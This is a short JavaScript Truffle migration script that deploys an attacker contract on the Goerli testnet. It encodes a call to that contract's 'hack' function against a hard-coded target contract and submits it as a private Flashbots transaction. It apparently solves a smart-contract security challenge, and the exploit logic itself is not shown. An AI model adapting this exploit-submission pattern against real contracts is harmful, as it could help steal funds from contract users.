const { BigNumber, providers, Wallet, ethers } = require("ethers");
const {
    FlashbotsBundleProvider,
    FlashbotsTransactionResolution,
} = require("@flashbots/ethers-provider-bundle");

const GWEI = BigNumber.from(10).pow(9);
const LEGACY_GAS_PRICE = GWEI.mul(12);

const provider = providers.getDefaultProvider("goerli");
const FLASHBOTS_EP = "https://relay-goerli.flashbots.net/";

const AddWinner = artifacts.require("AddWinner");
const Task = artifacts.require("Task");

module.exports = async function (deployer) {
    const authSigner = Wallet.createRandom();

    let mnemonic = process.env.MNEMONIC;
    let mnemonicWallet = Wallet.fromMnemonic(mnemonic);

    const wallet = new Wallet(mnemonicWallet.privateKey || "", provider);
    console.log("wallet.address");
    console.log(wallet.address);

    const taskContract = "0x6642f17A4A4F211F8DbF68d5C84dc54B9682d96b";
    //const addWinnerContractAddr = "0x56791b77da9A1CB7aDF155Be91B4B0b01fE47386";

    await deployer.deploy(AddWinner);
    const addWinnerInstance = await AddWinner.deployed(AddWinner);

    console.log(addWinnerInstance.address);

    let ABI = ["function hack(address target)"];
    let iface = new ethers.utils.Interface(ABI);
    const data = iface.encodeFunctionData("hack", [taskContract]);
    console.log("data");
    console.log(data);

    const flashbotsProvider = await FlashbotsBundleProvider.create(
        provider,
        authSigner,
        FLASHBOTS_EP,
        "goerli",
    );

    const tx = {
        from: wallet.address,
        to: addWinnerInstance.address,
        gasPrice: BigNumber.from(99).mul(1e9),
        gasLimit: BigNumber.from(116714),
        data: data,
        nonce: await provider.getTransactionCount(wallet.address),
    };

    const privateTx = {
        transaction: tx,
        signer: wallet,
    };

    const res = await flashbotsProvider.sendPrivateTransaction(privateTx);

    console.log(await res.simulate());
};
